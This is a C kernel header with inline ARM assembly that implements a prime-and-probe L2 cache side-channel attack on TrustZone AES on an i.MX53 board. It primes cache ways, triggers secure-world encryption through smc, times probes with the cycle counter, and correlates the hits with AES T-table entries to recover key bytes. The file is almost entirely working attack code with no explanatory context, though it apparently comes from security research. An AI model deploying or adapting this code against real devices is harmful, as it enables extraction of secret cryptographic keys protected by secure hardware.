#ifndef TZGhostImplv2
#define TZGhostImplv2

// va to probe, the offset of memory address to probe
// set to probe, the number of cache set to probe
// result area stores the result of prime and probe
// aesBufferarea stores the ciphertext

void asmPrimeAndProbeAesMultiL2Way(u32 vaToProbe, 
	u32 setToProbe, u32 resultArea, 
	u32 aesBufferPhyPtr, u32 way)
{
		// "dmb					\n\t"
		// "isb					\n\t"
		// "dsb 				\n\t"
	asm volatile(

		"ldr r5,%0				\n\t"	// va to probe
		"ldr r6,%1				\n\t"	// set
		"ldr r7,%2				\n\t"	// result 
		"ldr r1,%3 				\n\t"	// aes buffer
		"ldr r8,%4				\n\t"   // way to track


		// fill in all cache, r5 vaToProbe, r6 setToProbe
		// r3 <- va , r4 <- set, r2 <- way
		
		
		"mov r2,r8						\n\t"	// r2 way counter
		"cacheFillWayLoopV2:        	\n\t"
			"mov r4,r6					\n\t"	// r4 - set counter
			"ldr  r0,=0x8000			\n\t"	
			"subs r3,r2,#1				\n\t"
			"mla  r3,r0,r3,r5			\n\t"	// start position = way*0x8000 + va 					
			"cacheFillLoopV2:			\n\t"
				"ldr 	r0,[r3]			\n\t"
				"dmb 					\n\t"	// FIXME : remove isb and dsb after test
				"isb 					\n\t"
				"dsb 					\n\t"
				"adds 	r3,r3,#64		\n\t"
				"subs	r4,r4,#1		\n\t"
			"bne cacheFillLoopV2		\n\t"
			"subs r2,r2,#1 				\n\t"
		"bne cacheFillWayLoopV2			\n\t"

		// invoke the encryption
		"ldr  r0,=165 				\n\t" 
		"adds r2, r1, #16 			\n\t"
		"ldr  r3,=16 				\n\t"
		"adds r4, r1, #32 			\n\t"
		"smc 0x0 					\n\t"
		
		"dmb						\n\t"
		"isb						\n\t"
		"dsb 						\n\t"

		// enable performance counter
		"ldr r0,=0xffffffff		\n\t"
		"mcr p15,0,r0,c9,c12,1 	\n\t"		// enable cycle counter
		"mcr p15,0,r0,c9,c12,3 	\n\t"		// clear overflow
		"isb					\n\t"

		// now probes the area, 
		// r5 vaToProbe, r6 setToProbe
		// r7 resultArea r8 wayToProbe

		// r4 set counter
		// r8 way counter
		// r0, r1, r2 scrap
		// r3 va to prime variable
		// r9 result area for prime
		"probeWayLoopV2:				\n\t"
			"ldr  r0,=0x8000			\n\t"
			"subs r1,r8,#1				\n\t"
			"mla  r3,r0,r1,r5			\n\t" // r3 stores the va to start priming
			"mla  r9,r0,r1,r7 			\n\t" // r9 stores the result
			"mov  r4,r6					\n\t" // r4 stores the set to prime
			//loops to prime the r9 way
			"probeLoopV2:				\n\t"
				// start time
				"isb					\n\t"
				"dsb					\n\t"		// let's do this to be more accurate
				"mrc p15,0,r0,c9,c12,0	\n\t"		// pmnc - read reg
				"orr r0,r0,#0x4			\n\t"		// sets the counter reset bit
				"mcr p15,0,r0,c9,c12,0	\n\t"		// pmnc - write reg
				// start timer
				"mrc p15,0,r1,c9,c13,0 	\n\t"		// reads the cycle counter
				"ldr r0,[r3]			\n\t"
				"dmb 					\n\t"
				"isb					\n\t"
				"dsb					\n\t"
				// stops timer 
				"mrc p15,0,r2,c9,c13,0 	\n\t"		// reads the cycle counter
				"subs r0,r2,r1			\n\t"
				"str  r0,[r9]			\n\t"		// memory write should not trigger cache fill
				"adds r9, r9, #4 		\n\t"		// result ptr
				"adds r3, r3, #64 		\n\t"		// mem to probe
				"subs r4, r4, #1 		\n\t"		// decremenet loop counter 
			"bne probeLoopV2 			\n\t"
			// end of priming one way
			"subs r8, r8, #1			\n\t"
		"bne probeWayLoopV2				\n\t"


		: 
		: "m"(vaToProbe),"m"(setToProbe),"m"(resultArea),"m"(aesBufferPhyPtr),"m"(way)
		: "r0","r1","r2","r3","r4","r5","r6","r7","r8","r9"
		);

}

// runs the encryptionsToSniff round of AES, returns number of correct key bytes guessed
// version 2 removes all the dependencies on the secure function support
u8 attackIMX53v2(u32 encryptionsToSniff)
{
	#define attackWayToPrime 4

	memset(setHitCount, 0, 256);	

	printk("side channel attack with %u iteration\n", encryptionsToSniff);

	unsigned char roundKey[] = {0xd0, 0x14, 0xf9, 0xa8, 0xc9, 0xee, 0x25, 0x89, 0xe1, 0x3f, 0x0c, 0xc8, 0xb6, 0x63, 0x0c, 0xa6};
	unsigned char key[]      = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};
  	unsigned char iv[]  	 = {0x0,  0x0,  0x0,   0x0, 0x0,  0x0,  0x0,   0x0,  0x0,  0x0, 0x0,  0x0,  0x0,  0x0,  0x0,  0x0 };
 	unsigned char in[]  	 = {0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a };

    allocateContinuousMemory();

	// for AES, we need iv, input and output
	unsigned int    aes_buffer_offset = v2_attack_vp_offset;
	//unsigned int    aes_buffer_offset = 0x0;
	unsigned char * key_ptr 		  = vp + aes_buffer_offset;
	unsigned char * input_buffer_ptr  = key_ptr			  + aes_buffer_len;
	unsigned char * output_buffer_ptr = input_buffer_ptr  + aes_buffer_len;
	unsigned char * iv_ptr 			  = output_buffer_ptr + aes_buffer_len;
	unsigned int  * probeResultPtr	  = (unsigned int*)(iv_ptr + aes_iv_length);

	memcpy(key_ptr, key, aes_iv_length);
	flushL1L2(2);

	// initialize aes encryption key
	tz_aes_init(virt_to_phys(key_ptr),1,0,0);

	if(vp==0)
	{
		printk("fail to allocate memory\n");
		return;
	}
	
	memset(output_buffer_ptr, 	0xAB, 	aes_buffer_len);
	memcpy(iv_ptr,				iv,		aes_iv_length);
	memcpy(input_buffer_ptr,	in,		aes_buffer_len);

	int i = 0;
	for(i = 0 ; i < attackWayToPrime; i++)
		memset(probeResultPtr+i*0x8000,		0x0,	4*aes_table_set_size);


	//memory layout of trust zone aes encryption table
	unsigned char * aes_table_ptr 	= vp + aes_table_memory_set_offset;
	unsigned char * l2PrimeArea 	= vp + l2_way_len;
	
	unsigned int observationNumber = 0;

	u8 cacheTableSet = 0;
	u8 cacheSetToStart = 0;
	u8 keyByteOffset = 0;
	u8 valInSet = 0;

	for(observationNumber = 0; observationNumber < encryptionsToSniff; observationNumber++)
	{

		//memset(input_buffer_ptr, 0, aes_buffer_len);
		//memset(iv_ptr, 0, aes_iv_length);
		get_random_bytes(input_buffer_ptr, aes_buffer_len);

		flushL1L2(2);

		local_irq_disable();

		asmPrimeAndProbeAesMultiL2Way(	aes_table_ptr,
										aes_table_set_size,
										probeResultPtr,
										virt_to_phys(input_buffer_ptr),
										attackWayToPrime
									  );


		local_irq_enable();

		#ifdef v2debug
			printProbeResult(probeResultPtr,aes_table_set_size,attackWayToPrime);
		#endif


		int wayCounter = 0;

		// saves the result in channel information
		for(keyByteOffset = 0; keyByteOffset < 16; keyByteOffset++)
		{
			for(wayCounter = 0; wayCounter < attackWayToPrime; wayCounter++)
			{
				// for the byte i, the table of (i+2)%4 should be examine
				cacheSetToStart = ((keyByteOffset + 2)%4) * 16;
				for(cacheTableSet = cacheSetToStart ; cacheTableSet < cacheSetToStart + aes_table_set_size/4; cacheTableSet++) 
				{
					// if less than threshold, then it means aes table did not hit
					// continue on the loop, since there was no hit 
					if(probeResultPtr[cacheTableSet + cortexa8_L2_waySize/4*wayCounter] < cortexA8_load_from_l2_time)
						continue;

					// we care correlating the cipher text, cycle on all key bytes
					for(valInSet = 0; valInSet < aes_t_table_entry_in_cacheset; valInSet++)
					{

						u8 table_entry = 0;
						if     (keyByteOffset %4 == 0) 	table_entry = (Te2[cacheTableSet*16%256+valInSet] >> 24) & 0xff;
						else if(keyByteOffset %4 == 1)  table_entry = (Te3[cacheTableSet*16%256+valInSet] >> 16) & 0xff;
						else if(keyByteOffset %4 == 2)	table_entry = (Te0[cacheTableSet*16%256+valInSet] >> 8 ) & 0xff;
						else if(keyByteOffset %4 == 3)  table_entry =  Te1[cacheTableSet*16%256+valInSet]		 & 0xff;

						u8 keyVal = output_buffer_ptr[keyByteOffset] ^ table_entry;
						channelMeasure[getIndex(keyByteOffset,keyVal)]++;
					}
				}
			}
		}
	}

	#ifdef v2debug
		printSetHitMeasure();
	#endif

	u8 keyBytesGuessed = printKeyGuessed(roundKey);

	printk("\n");
	freeContinuousMemory();

	return keyBytesGuessed;
}






#endif